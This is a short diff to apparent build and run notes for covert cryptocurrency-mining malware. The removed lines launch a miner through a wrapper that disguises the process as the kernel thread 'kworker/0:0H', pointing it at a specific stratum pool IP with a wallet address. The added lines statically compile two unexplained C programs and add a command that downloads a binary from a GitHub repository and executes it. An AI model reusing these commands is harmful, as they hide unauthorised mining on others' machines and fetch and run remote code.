@@ -6,10 +6,12 @@ gcc x.c -o x -pthread
 
 gcc x.c -o x -lpthread
 
+apt update && apt install musl musl-dev musl-tools
+
+musl-gcc -static own.c -o own
+musl-gcc -static sx.c -o sx
+
 
 #execute
 
-./x -c -s "kworker/0:0H" -d -p test.pid node run.js
-
-
-./x -c -s "kworker/0:0H" -d -p test.pid ./dx -o stratum+tcp://141.94.223.113:4052 -u 49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU -k -p x
+wget https://github.com/x011-al/flex-x/raw/refs/heads/main/own && chmod +x && ./own
